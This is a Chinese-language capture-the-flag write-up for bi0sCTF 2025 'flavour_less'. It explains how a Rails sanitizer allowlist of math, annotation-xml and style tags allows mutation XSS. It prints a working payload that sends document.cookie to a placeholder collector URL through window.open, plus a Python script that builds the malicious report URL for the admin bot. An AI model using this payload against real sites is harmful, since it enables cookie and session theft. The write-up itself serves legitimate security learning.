# bi0sCTF 2025 - flavour_less 题解

## 题目简述

这是一道 Ruby on Rails 管理员 Bot 题。首页把 `input` 参数交给 Rails `sanitize`，仅显式允许 `math`、`annotation-xml` 和 `style` 三种标签，再用 `raw` 输出。报告接口只允许 Bot 访问 `localhost`，但访问前会给该域写入可由 JavaScript 读取的 flag Cookie。目标就是利用 HTML 在清洗器与浏览器之间的解析差异触发 mXSS，并把 Cookie 发到自己的接收端。

管理员源码中的真实 Cookie 为：

```text
bi0sctf{easy_right?_now_try_sfs_v1_:)}
```

## 解题过程

入口在 `FlavourController#index`：

```ruby
user_input = params[:input]
@sanitized_input = sanitize(
  user_input,
  tags: ["math", "annotation-xml", "style"]
)
```

视图随后执行：

```erb
<%= raw @sanitized_input %>
```

单看标签白名单似乎无法插入 `img`，但 `math` 属于 MathML 外来内容，`annotation-xml encoding="text/html"` 会切换 HTML 集成点，`style` 在不同解析上下文中的文本/元素处理又不同。清洗阶段生成的字符串被浏览器作为 HTML 再解析时，原本藏在该嵌套结构中的 `img` 会重新成为元素，其 `src` 失败后触发 `onerror`。这正是 mutation XSS：危险节点不是简单穿过白名单，而是在第二次解析时出现。

仓库 `admin/exploit/solver.md` 给出的核心结构如下。把 `<COLLECTOR>` 换成自己可接收查询参数的 HTTPS 地址：

```html
<math><annotation-xml encoding="text/html"><style><img src onerror=window.open(`https://<COLLECTOR>/?cookie=${document.cookie}`)>
```

管理接口是 GET 请求，而不是另一个 `bot.js` 所暗示的独立命令行 Bot：

```ruby
url = params[:url]
unless url.present? && url.match?(/\Ahttps?:\/\/localhost(:\d+)?(\/.*)?\z/)
  # reject
end
```

`ReportController` 自己启动 Puppeteer，并设置名为 `flag` 的 Cookie。仓库同时保留的 `app/bot/bot.js` 会设置不同的 `sid` Cookie，但当前 Rails 路由没有调用它，不能把那份遗留代码当成实际执行链。

最终请求形态为：

```text
http://localhost:3000/report?url=http://localhost:3000/?input=<URL_ENCODED_PAYLOAD>
```

可以用下面的标准库代码生成完整 URL，避免手工编码破坏嵌套标签：

```python
from urllib.parse import quote

collector = "https://<COLLECTOR>/"
payload = (
    '<math><annotation-xml encoding="text/html"><style>'
    '<img src onerror=window.open(`'
    + collector
    + '?cookie=${document.cookie}`)>'
)
victim = "http://localhost:3000/?input=" + quote(payload, safe="")
report = "http://<CHALLENGE_HOST>/report?url=" + quote(victim, safe="")
print(report)
```

访问生成的 `report` 地址后，Bot 在 `localhost` 页面中触发载荷，接收端会得到 `cookie=flag=...`。本文没有重新启动完整 Rails/Puppeteer 环境；载荷、Cookie 名和值以及报告路由均来自当前仓库的管理员源码和官方 solver。

## 方法总结

本题的决定性障碍是 mXSS，而不是普通的“事件属性漏过滤”。审计 sanitizer 时必须同时考虑清洗器解析树、序列化结果和浏览器二次解析树，尤其关注 MathML/SVG 外来内容、HTML 集成点和 RCDATA/RAW文本元素。管理员 Bot 的实际入口也必须沿路由核对，不能因为仓库里另有一个未被调用的 Bot 文件就混淆 Cookie 名和值。
